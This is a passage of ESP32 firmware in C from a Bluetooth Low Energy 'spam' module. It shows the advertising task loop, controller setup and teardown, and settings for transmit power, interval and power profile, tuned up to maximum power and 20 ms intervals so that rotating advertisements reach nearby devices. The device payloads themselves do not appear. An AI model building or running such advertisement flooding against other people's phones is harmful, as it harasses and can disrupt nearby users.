      ret = esp_ble_gap_start_advertising(&ble_adv_params);
      if (ret == ESP_OK) {
        if (wait_gap_event(ret, pdMS_TO_TICKS(50))) {
          is_advertising_active = true;
        }
      }
    }

    /* 5. Dwell for ~250ms in 50ms slices for fast exit response */
    for (int i = 0; i < 5 && running_task; i++) {
      vTaskDelay(pdMS_TO_TICKS(50));
    }

    /* 6. Advance to next model within current active mode */
    adv_index = (adv_index + 1) % active_indices_count;
  }

  /* Cleanup on task exit */
  if (is_advertising_active) {
    esp_ble_gap_stop_advertising();
    is_advertising_active = false;
  }

  /* Final heap report */
  size_t free_heap = heap_caps_get_free_size(MALLOC_CAP_8BIT);
  size_t min_free = heap_caps_get_minimum_free_size(MALLOC_CAP_8BIT);
  ESP_LOGI(TAG, "Spam stopped. Final heap: free=%zu KB, min during run=%zu KB, overall min=%zu KB",
           free_heap / 1024, min_free_heap_during_spam / 1024, min_free / 1024);
  cycle_count = 0;
  last_heap_log_cycle = 0;
  min_free_heap_during_spam = 0;

  adv_task_handle = NULL;
  vTaskDelete(NULL);
}

void bt_spam_register_cb(bt_spam_cb_display callback) {
  display_records_cb = callback;
}

bool bt_spam_is_running(void) {
  return running_task;
}

void bt_spam_app_main(bt_spam_mode_t mode) {
#if !defined(CONFIG_BT_SPAM_APP_DEBUG)
  esp_log_level_set(TAG, ESP_LOG_NONE);
#endif

  esp_err_t ret;

  // Initialize BT controller if not already done
  if (!bt_controller_initialized) {
    esp_bt_controller_config_t bt_cfg = BT_CONTROLLER_INIT_CONFIG_DEFAULT();
    ret = esp_bt_controller_init(&bt_cfg);
    if (ret != ESP_OK) {
      ESP_LOGE(TAG, "bt_controller_init failed: %s", esp_err_to_name(ret));
      return;
    }
    bt_controller_initialized = true;
  }

  // Enable BT controller for BLE mode
  if (esp_bt_controller_get_status() == ESP_BT_CONTROLLER_STATUS_INITED) {
    ret = esp_bt_controller_enable(ESP_BT_MODE_BLE);
    if (ret != ESP_OK) {
      ESP_LOGE(TAG, "bt_controller_enable failed: %s", esp_err_to_name(ret));
      return;
    }
  }

  // Initialize Bluedroid if not already done
  if (!bluedroid_initialized) {
    esp_bluedroid_config_t bluedroid_config = BT_BLUEDROID_INIT_CONFIG_DEFAULT();
    ret = esp_bluedroid_init_with_cfg(&bluedroid_config);
    if (ret != ESP_OK) {
      ESP_LOGE(TAG, "bluedroid_init failed: %s", esp_err_to_name(ret));
      return;
    }
    bluedroid_initialized = true;
  }

  // Enable Bluedroid
  if (esp_bluedroid_get_status() == ESP_BLUEDROID_STATUS_INITIALIZED) {
    ret = esp_bluedroid_enable();
    if (ret != ESP_OK) {
      ESP_LOGE(TAG, "bluedroid_enable failed: %s", esp_err_to_name(ret));
      return;
    }
  }

  if (adv_sem == NULL) {
    adv_sem = xSemaphoreCreateBinary();
    if (adv_sem == NULL) {
      ESP_LOGE(TAG, "Failed to create adv_sem");
      return;
    }
  }

  // Register our GAP callback via the central dispatcher so that other
  // modules (bt_gatts, ble_hid, surv_radio, gattcmd) can also receive GAP
  // events without overwriting each other's registration.
  ret = gap_dispatcher_register(esp_gap_cb);
  if (ret != ESP_OK) {
    ESP_LOGE(TAG, "gap_dispatcher_register failed: %s", esp_err_to_name(ret));
    return;
  }
  gap_callback_registered = true;

  /* Set RF TX power with fallback - use safe defaults for ESP32-C6 */
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
  esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);

  current_mode = mode;
  rebuild_active_indices(current_mode);
  adv_index = 0;
  esp_ble_gap_stop_advertising();
  drain_sem();
  is_advertising_active = false;
  running_task = true;
  xTaskCreate(&start_adv, "bt_spam_adv", 4096, NULL, 5, &adv_task_handle);
}

void bt_spam_app_stop(void) {
  running_task = false;
  display_records_cb = NULL;

  /* Unblock waiting task */
  if (adv_sem != NULL) {
    xSemaphoreGive(adv_sem);
  }

  /* Wait for task to exit cleanly - task cleans up advertising on exit */
  if (adv_task_handle != NULL) {
    uint8_t retries = 200; /* 200 x 10ms = 2s max wait */
    while (adv_task_handle != NULL && retries-- > 0) {
      vTaskDelay(pdMS_TO_TICKS(10));
    }
    if (adv_task_handle != NULL) {
      ESP_LOGW(TAG, "Adv task didn't exit cleanly, forcing delete");
      vTaskDelete(adv_task_handle);
      adv_task_handle = NULL;
    }
  }

  /* Ensure advertising is stopped at the controller level */
  if (is_advertising_active) {
    esp_ble_gap_stop_advertising();
    /* Wait for stop event */
    vTaskDelay(pdMS_TO_TICKS(100));
    is_advertising_active = false;
  }

  /* Note: We don't deinit bluedroid/controller here because they may be
   * used by other modules. They are initialized once and kept alive. */
}

void bt_spam_app_deinit(void) {
  bt_spam_app_stop();

  if (bluedroid_initialized) {
    esp_bluedroid_disable();
    esp_bluedroid_deinit();
    bluedroid_initialized = false;
  }

  if (bt_controller_initialized) {
    esp_bt_controller_disable();
    esp_bt_controller_deinit();
    bt_controller_initialized = false;
  }

  if (adv_sem != NULL) {
    vSemaphoreDelete(adv_sem);
    adv_sem = NULL;
  }

  gap_callback_registered = false;
  display_records_cb = NULL;
}

esp_err_t bt_spam_set_tx_power(esp_power_level_t power_level) {
  esp_err_t ret = esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, power_level);
  if (ret == ESP_OK) {
    ret = esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, power_level);
  }
  if (ret == ESP_OK) {
    ESP_LOGI(TAG, "TX power set to %d dBm", power_level);
  }
  return ret;
}

esp_err_t bt_spam_set_adv_interval(uint16_t min_interval, uint16_t max_interval) {
  if (min_interval > max_interval || min_interval < 0x20) {
    return ESP_ERR_INVALID_ARG;
  }
  ble_adv_params.adv_int_min = min_interval;
  ble_adv_params.adv_int_max = max_interval;

  if (is_advertising_active && running_task) {
    esp_ble_gap_stop_advertising();
    is_advertising_active = false;
    vTaskDelay(pdMS_TO_TICKS(50));
    esp_err_t ret = esp_ble_gap_start_advertising(&ble_adv_params);
    if (ret == ESP_OK) {
      is_advertising_active = true;
    }
  }
  ESP_LOGI(TAG, "Adv interval set: min=0x%04x, max=0x%04x", min_interval, max_interval);
  return ESP_OK;
}

esp_err_t bt_spam_get_heap_stats(uint32_t* free_kb, uint32_t* min_kb, float* fragmentation) {
  if (free_kb == NULL || min_kb == NULL || fragmentation == NULL) {
    return ESP_ERR_INVALID_ARG;
  }
  size_t free_heap = heap_caps_get_free_size(MALLOC_CAP_8BIT);
  size_t min_free = heap_caps_get_minimum_free_size(MALLOC_CAP_8BIT);
  size_t largest_block = heap_caps_get_largest_free_block(MALLOC_CAP_8BIT);

  *free_kb = free_heap / 1024;
  *min_kb = min_free / 1024;

  if (free_heap > 0) {
    *fragmentation = ((float)(free_heap - largest_block) / (float)free_heap) * 100.0f;
  } else {
    *fragmentation = 100.0f;
  }
  return ESP_OK;
}

static bt_spam_power_profile_t current_power_profile = BT_SPAM_POWER_HIGH;

esp_err_t bt_spam_set_power_profile(bt_spam_power_profile_t profile) {
  if (profile > BT_SPAM_POWER_LOW) {
    return ESP_ERR_INVALID_ARG;
  }

  current_power_profile = profile;

  esp_err_t ret = ESP_OK;
  switch (profile) {
    case BT_SPAM_POWER_HIGH:
      ret = esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P9);
      if (ret == ESP_OK) {
        ret = esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P9);
      }
      ble_adv_params.adv_int_min = 0x20;  // 20ms
      ble_adv_params.adv_int_max = 0x30;  // 30ms
      break;
    case BT_SPAM_POWER_BALANCED:
      ret = esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P6);
      if (ret == ESP_OK) {
        ret = esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P6);
      }
      ble_adv_params.adv_int_min = 0x40;  // 40ms
      ble_adv_params.adv_int_max = 0x60;  // 60ms
      break;
    case BT_SPAM_POWER_LOW:
      ret = esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_ADV, ESP_PWR_LVL_P3);
      if (ret == ESP_OK) {
        ret = esp_ble_tx_power_set(ESP_BLE_PWR_TYPE_DEFAULT, ESP_PWR_LVL_P3);
      }
      ble_adv_params.adv_int_min = 0x80;  // 80ms
      ble_adv_params.adv_int_max = 0xA0;  // 100ms
      break;
  }

  if (is_advertising_active && running_task && ret == ESP_OK) {
    esp_ble_gap_stop_advertising();
    is_advertising_active = false;
    vTaskDelay(pdMS_TO_TICKS(50));
    ret = esp_ble_gap_start_advertising(&ble_adv_params);
    if (ret == ESP_OK) {
      is_advertising_active = true;
    }
  }

  ESP_LOGI(TAG, "Power profile set to %d (TX power: %d, adv interval: 0x%04x-0x%04x)",
           profile,
           (profile == BT_SPAM_POWER_HIGH) ? 9 : (profile == BT_SPAM_POWER_BALANCED) ? 6 : 3,
           ble_adv_params.adv_int_min, ble_adv_params.adv_int_max);
  return ret;
}

bt_spam_power_profile_t bt_spam_get_power_profile(void) {
  return current_power_profile;
}
